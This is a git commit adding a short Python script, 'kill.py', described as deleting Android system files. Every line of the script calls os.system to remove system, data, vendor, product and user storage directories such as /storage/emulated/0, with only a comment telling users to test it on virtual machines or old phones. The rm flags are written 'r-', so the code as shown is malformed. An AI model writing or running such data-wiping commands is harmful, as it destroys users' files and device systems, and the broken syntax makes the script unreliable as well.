ceaf01884728d77fe70b5e489008ade3acd5037d
taveirafracenir-cloud <taveirafracenir@gmail.com>
2025-11-19 17:59:39 -0300

    Create kill.py to delete Android system files
    Added a script to remove system and data directories on Android devices.

---
+++ Android/System kill.py
@@ -0,0 +1,14 @@
+#atenção teste esse código apenas em máquinas virtuais ou celulares velhos 
+import os
+#==Velhos==#
+os.system('rm r- system')
+os.system('rm r- data')
+os.system('rm r- /storage/emulated/0')
+os.system('rm r- sdcard')
+os.system('rm r- vendor')
+#==novos==#
+os.system('rm r- system')
+os.system('rm r- product')
+os.system('rm r- system_ext')
+os.system('rm r- data')
+os.system('rm r- /storage/emulated/0')
